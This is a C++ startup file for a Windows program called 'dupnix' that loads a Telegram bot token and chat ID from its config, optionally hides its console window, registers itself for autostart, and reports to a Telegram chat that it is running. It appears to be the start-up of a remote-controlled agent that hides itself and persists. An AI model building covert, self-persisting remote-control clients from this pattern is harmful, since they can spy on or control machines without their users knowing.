#include "startup.h"

#include <iostream>
#include <fstream>
#include <Windows.h>
#include <filesystem>

#include <nlohmann/json.hpp>

#include "tools.h"
#include "globals.h"
#include "telegram.h"
#include "autostart.h"

using json = nlohmann::json;

void printLogo() {
	std::cout << "      _                   _      ____  " << std::endl
		<< "     | |                 (_)    |___ \\ " << std::endl
		<< "   __| |_   _ _ __  _ __  ___  __ __) |" << std::endl
		<< "  / _` | | | | '_ \\| '_ \\| \\ \\/ /|__ < " << std::endl
		<< " | (_| | |_| | |_) | | | | |>  < ___) |" << std::endl
		<< "  \\__,_|\\__,_| .__/|_| |_|_/_/\\_\\____/  " << std::endl
		<< "             | |  " << VERSION << std::endl
		<< "             |_|                       ";
}

void loadData() {
	json data = tools::info::loadCfg();

	try {
		AUTOSTART = data["autostart"];
		HIDE_TERMINAL = data["hide_terminal"];

		REFRESH = data["refresh_rate"];
		ID = data["id"];
		BOT_API = data["bot_token"];
		CHAT_ID = data["chat_id"];
		PATH = data["path"];
	}
	catch (...) {
		throw std::runtime_error("can't parse config file!");
	}
}

void startup() {
	// cd to the folder dupnix is inside
	std::filesystem::current_path(tools::info::getDupnixPath().substr(0, tools::info::getDupnixPath().size() - tools::info::getExeName().size()));

	try {
		loadData();
	}
	catch(...) {
		std::cerr << "couldn't parse config file\n";
		exit(1);
	}

	if (HIDE_TERMINAL)
		ShowWindow(::GetConsoleWindow(), SW_HIDE);
	if (AUTOSTART)
		autostart();

	printLogo();

	telegram::SendText(ID + " is running");
	std::cout << "\nID: " + ID << std::endl;
}
